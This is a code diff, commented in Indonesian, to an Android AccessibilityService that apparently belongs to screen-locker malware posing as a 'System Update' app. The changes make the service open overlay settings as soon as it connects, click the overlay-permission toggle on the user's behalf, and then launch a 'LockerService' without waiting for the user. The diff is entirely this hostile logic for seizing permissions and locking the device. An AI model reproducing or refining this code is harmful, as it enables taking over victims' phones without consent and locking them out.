@@ -19,13 +19,10 @@ public class CustomAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        writeLog("Service Connected - Attempting immediate jump to Overlay");
+        writeLog("Service Connected - Skipping system dialogs, jumping directly to Overlay Settings"); //
         
-        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-            if (!Settings.canDrawOverlays(this)) {
-                jumpToOverlaySettings();
-            }
-        }, 500);
+        // Langsung lompat tanpa menunggu event pertama
+        jumpToOverlaySettings(); //
     }
 
     private void writeLog(String text) {
@@ -48,7 +45,8 @@ public class CustomAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-        if (rootNode == null) return;
+        // Jika rootNode null, langsung keluar tanpa masuk ke blok try-finally
+        if (rootNode == null) return; 
 
         try {
             String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
@@ -62,44 +60,43 @@ public class CustomAccessibilityService extends AccessibilityService {
             if (!Settings.canDrawOverlays(this)) {
                 handleOverlayPermissionFlow(rootNode, packageName);
             } else {
+                // Jika sudah punya izin, pastikan LockerService aktif
                 triggerLocker();
             }
 
         } finally {
-            rootNode.recycle();
+            // Objek dipastikan tidak null di sini karena sudah dicek di atas
+            rootNode.recycle(); 
         }
     }
-
+    
     private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
         long now = System.currentTimeMillis();
         if (now - lastActionTime < ACTION_DELAY) return;
 
-        // Cari Label Aplikasi dan Switch
-        List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText("System Update");
-        AccessibilityNodeInfo switchNode = findNodeById(root, "android:id/switch_widget");
+        // Pastikan kita HANYA beraksi jika di dalam paket Settings
+        if (!pkg.contains("settings")) return; //
 
-        // STATE A: Di dalam halaman detail aplikasi kita
+        // 1. CEK: Apakah kita sudah di halaman DETAIL aplikasi?
+        // Gunakan findAccessibilityNodeInfosByText("System Update") agar tidak salah klik di menu lain
+        List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText("System Update"); //
+        AccessibilityNodeInfo switchNode = findNodeById(root, "android:id/switch_widget"); //
+
         if (!labels.isEmpty() && switchNode != null) {
             if (!switchNode.isChecked()) {
-                writeLog("Detail page found. Clicking switch ON.");
+                writeLog("Confirmed Detail Page. Clicking Toggle ON."); //
                 performClick(switchNode);
             } else {
-                writeLog("Switch is ON. Going back.");
-                performGlobalAction(GLOBAL_ACTION_BACK);
+                writeLog("Toggle already ON. Launching Locker Service."); //
+                triggerLocker(); // Langsung eksekusi tanpa menunggu user kembali
             }
             switchNode.recycle();
             return;
         }
 
-        // STATE B: Di dalam daftar pengaturan
-        if (pkg.contains("settings")) {
-            writeLog("In settings list. Clicking 'System Update'.");
-            clickByText(root, "System Update");
-            return;
-        }
-
-        // STATE C: Nyasar/Terhenti
-        jumpToOverlaySettings();
+        // 2. CEK: Jika masih di DAFTAR (List) aplikasi Settings
+        // Cari teks yang benar-benar spesifik "System Update"
+        clickByText(root, "System Update"); //
     }
 
     private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
